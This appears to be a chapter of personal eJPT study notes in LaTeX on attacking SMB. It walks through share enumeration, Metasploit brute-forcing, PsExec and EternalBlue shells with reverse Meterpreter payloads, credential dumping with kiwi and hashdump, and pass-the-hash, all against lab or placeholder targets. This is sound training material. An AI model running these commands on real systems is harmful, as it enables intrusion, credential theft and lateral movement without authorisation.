\chapter{SMB --- Server Message Block}
\label{ch:smb}

SMB is one of the most exploited protocols in Windows environments. From credential
brute-forcing with PsExec to unauthenticated remote code execution via EternalBlue,
understanding SMB deeply is essential for the eJPT and for real engagements.

% ─────────────────────────────────────────────────────────────────────────────
\section{What SMB Is}
\label{sec:smb_theory}

SMB (Server Message Block) is a network file-sharing protocol used to facilitate
sharing of files, printers, and serial ports between computers on a local network.

\textbf{Key facts:}
\begin{itemize}
  \item SMB runs on \textbf{port 445 (TCP)}. Originally it ran on top of
        NetBIOS using port 139.
  \item \textbf{SAMBA} is the open-source Linux implementation of SMB, allowing
        Windows systems to access Linux shares.
  \item SMB is used for Windows while SAMBA is used on Linux --- but both speak
        the same protocol.
\end{itemize}

\begin{whybox}[Why SMB matters in pentesting]
SMB is enabled by default on every Windows machine and is one of the most
historically vulnerable services. It was the vector for WannaCry, NotPetya, and
countless real-world breaches. Finding port 445 open is always worth investigating
deeply.
\end{whybox}

% ─────────────────────────────────────────────────────────────────────────────
\section{SMB Authentication}
\label{sec:smb_auth}

SMB uses two levels of authentication:

\begin{enumerate}
  \item \textbf{User authentication} --- username and password required to access
        the SMB server and its shares. This is the standard mode.
  \item \textbf{Share authentication} --- a password is set on the share itself,
        not tied to a user account.
\end{enumerate}

\begin{notebox}[Null sessions]
Some SMB configurations allow \textit{null sessions} --- connecting without any
credentials. This was common on older Windows versions and still appears on
misconfigured legacy systems. Always try null session first.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{SMB Enumeration Commands}
\label{sec:smb_enum_commands}

\begin{notebox}
Full enumeration workflow is in Chapter~\ref{ch:enumeration}. These are the
SMB-specific commands to reference quickly.
\end{notebox}



\begin{termbox}
# List shares (guest access)
smbclient -L \\\\target_ip\\

# Null session attempt
smbclient -L demo.ine.local -N

# Connect to a specific share
smbclient \\\\target_ip\\share_name -U username

# Anonymous RPC connection
rpcclient -U "" -N demo.ine.local

# OS discovery via SMB
nmap --script smb-os-discovery.nse -p 445 target_ip

# Check SMB version and signing
nmap -sV -sC -p 445 target_ip

# Check EternalBlue vulnerability specifically
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target_ip
\end{termbox}

\begin{notebox}[Null sessions]

\screenshot{assets/images/Screenshot_2025-08-23_at_1.23.32_PM.png}{SMB enumeration showing shares and OS information}

% ─────────────────────────────────────────────────────────────────────────────
\section{SMB Exploitation with PsExec}
\label{sec:smb_psexec}

\subsection{What PsExec Is}

PsExec is a lightweight telnet-replacement developed by Microsoft that allows
executing processes on remote Windows systems using any user's credentials. It
authenticates via SMB, uploads a small service binary, and executes it remotely.

\textbf{Why it matters:}
\begin{itemize}
  \item No CVE required --- this is legitimate credential abuse
  \item Gives a full command shell or Meterpreter session on the target
  \item Very similar to RDP, but command-line instead of GUI
  \item Used in real engagements every day --- if you have admin credentials,
        PsExec gets you in
\end{itemize}

\subsection{PsExec Attack Flow}

\begin{enumerate}
  \item Identify open SMB on port 445
  \item Brute-force credentials using \ic{smb\_login}
  \item Use administrator credentials with \ic{exploit/windows/smb/psexec}
  \item Receive Meterpreter session
\end{enumerate}

\subsection{PsExec Commands}

\begin{termbox}
# Step 1 --- confirm SMB is open and get OS info
nmap -sV -sC target_ip

# Step 2 --- start Metasploit
service postgresql start && msfconsole
workspace -a smb_psexec

# Step 3 --- brute-force SMB credentials
search smb_login
use auxiliary/scanner/smb/smb_login
set RHOST target_ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Step 4 --- use psexec with found administrator credentials
search psexec
use exploit/windows/smb/psexec
set RHOST target_ip
set SMBUser Administrator
set SMBPass found_password
set LHOST my_kali_vpn_ip
exploit

# Step 5 --- post-exploitation
sysinfo
getuid
cd /
ls
cat flag.txt
\end{termbox}

\screenshot{assets/images/Screenshot_2025-08-23_at_1.33.05_PM.png}{smb\_login brute-force finding valid credentials}

\screenshot{assets/images/Screenshot_2025-08-23_at_1.41.00_PM.png}{PsExec exploit opening Meterpreter session as Administrator}

\begin{notebox}[PSexec payload options]
If you want a Meterpreter session with a payload (instead of just logging in
with credentials), add the payload steps:
\begin{termbox}
set payload windows/meterpreter/reverse_tcp
show options
# Confirm LHOST and LPORT are set correctly
exploit
\end{termbox}
The session without a payload logs in legitimately with no backdoor.
The session with a payload creates a Meterpreter connection but is more detectable.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{EternalBlue --- MS17-010}
\label{sec:eternalblue}

\begin{warnbox}[Critical warning]
EternalBlue only works on SMBv1. Do not run this exploit until memory options
are correctly set. Targeting kernel space memory without correct configuration
can crash the target system.
\end{warnbox}

\subsection{What EternalBlue Is}

EternalBlue (MS17-010 / CVE-2017-0144) is a collection of Windows vulnerabilities
that allow attackers to remotely execute arbitrary code without authentication by
sending specially crafted packets to the SMBv1 service.

\textbf{History:}
\begin{itemize}
  \item Developed by the NSA as an offensive cyberweapon
  \item Leaked to the public by the Shadow Brokers hacker group in 2017
  \item Used in the \textbf{WannaCry ransomware attack} (June 2017), spreading
        across networks globally in hours
  \item Patched by Microsoft in MS17-010, but unpatched systems remain common
\end{itemize}

\textbf{Affected systems:}
\begin{itemize}
  \item Windows Vista, 7, 8.1
  \item Windows Server 2008, 2012, 2016
  \item Windows 10 (pre-patch)
\end{itemize}

\subsection{EternalBlue Attack Flow}

\begin{termbox}
# Step 1 --- confirm SMBv1 and check vulnerability
sudo nmap -sV -p 445 -O target_ip
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target_ip
# Look for: VULNERABLE in output

# Step 2 --- Metasploit EternalBlue
service postgresql start && msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST target_ip
set LHOST my_ip
set LPORT listening_port
run

# Step 3 --- post-exploitation
sysinfo
getuid
\end{termbox}

\screenshot{assets/images/Screenshot_2025-08-24_at_10.23.57_AM.png}{nmap confirming MS17-010 vulnerability before exploitation}

\screenshot{assets/images/Screenshot_2025-08-24_at_10.28.56_AM.png}{EternalBlue exploit running and opening Meterpreter session}

\screenshot{assets/images/Screenshot_2025-08-24_at_10.34.02_AM.png}{Post-exploitation sysinfo and getuid confirming SYSTEM access}

\screenshot{assets/images/Screenshot_2025-08-24_at_10.36.53_AM.png}{EternalBlue session with full SYSTEM privileges}

\subsection{Post-EternalBlue --- Credential Dumping with Kiwi}

Once you have a SYSTEM Meterpreter session via EternalBlue, you can dump
credentials from memory using \tool{kiwi} (the Metasploit implementation of
Mimikatz).

\begin{termbox}
# Inside Meterpreter session
load kiwi
creds_all           # Dump all credentials
lsa_dump_sam        # Dump SAM database hashes
lsa_dump_secrets    # Dump LSA secrets

# Find running processes to migrate into
pgrep              # List process IDs
migrate <PID>      # Migrate into a stable process before loading kiwi
\end{termbox}

\subsection{Hashdump and Using Hashes with PsExec}

\begin{termbox}
# Dump password hashes from the SAM database
hashdump

# The output format is: username:RID:LM_hash:NTLM_hash:::
# Copy the NTLM hash for pass-the-hash attacks

# Use hash directly in psexec (pass-the-hash)
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass <NTLM_hash_copied_from_hashdump>
# Format: aad3b435b51404eeaad3b435b51404ee:NTLM_hash
exploit
\end{termbox}

\begin{notebox}[Background a session]
\ic{Ctrl+Z} puts the current Meterpreter session into the background without
closing it. Use \ic{sessions} to list all sessions and \ic{sessions -i N} to
reconnect to session number N.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item SMB is not just a file sharing protocol --- it is the most historically
        significant attack surface in Windows environments.
  \item PsExec with admin credentials is cleaner than exploiting a CVE. No
        system crash risk, no AV trigger on a generic payload, and it's the
        technique used in real engagements.
  \item EternalBlue is devastating but requires SMBv1. Modern systems are
        patched --- but legacy infrastructure in enterprises still runs it.
  \item \ic{VERBOSE false} on brute-force is essential. Thousands of failed
        lines make it impossible to spot the hit.
\end{itemize}

\textbf{Enumeration Mindset --- What to Check First When Port 445 is Open}
\begin{enumerate}
  \item \ic{nmap -sV -sC -p 445 target} --- get SMB version and signing status
  \item \ic{nmap --script smb-vuln-ms17-010} --- is it EternalBlue vulnerable?
  \item \ic{smbclient -L target -N} --- null session attempt
  \item If not vulnerable to EternalBlue: brute-force with \ic{smb\_login}
  \item If credentials found: PsExec for immediate access
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Running EternalBlue before checking the target is actually vulnerable ---
        can crash the system and alert defenders
  \item Forgetting to set \ic{LHOST} to the VPN interface --- the shell connects
        nowhere
  \item Using \ic{set} instead of \ic{setg} when switching modules --- target IP
        resets and you wonder why the exploit fails
  \item Running hashdump without migrating to a stable process first --- the session
        dies mid-dump
\end{itemize}

\textbf{Real-World Impact}
\begin{itemize}
  \item Open 445 + SMBv1 + unpatched = EternalBlue = full SYSTEM access, no
        credentials needed
  \item Weak SMB credentials = PsExec = full Administrator access to the machine
        and anything it can reach on the network
  \item Credential dump post-exploitation = lateral movement across the entire
        Windows domain using pass-the-hash
\end{itemize}
\end{takebox}

\end{notebox}